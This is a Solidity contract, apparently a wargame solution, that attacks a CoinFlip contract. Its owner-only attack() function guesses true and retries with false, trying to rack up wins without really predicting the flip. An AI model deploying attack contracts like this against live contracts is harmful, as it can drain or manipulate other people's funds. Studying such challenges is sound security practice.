// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

interface CoinFlip {
	function flip(bool _guess) external returns (bool);
}

contract AttackCoinFlip {
	address payable public owner;
	CoinFlip public attackAddress;

	constructor(address _addr) {
		attackAddress = CoinFlip(_addr);
		owner = payable(msg.sender);
	}

	function attack() public payable {
		require(msg.sender == owner, "You aren't the owner");

		bool success = attackAddress.flip(true);

		if (success == false) {
			success = attackAddress.flip(false);
		}

		require(success, 'flip failed');
	}
}
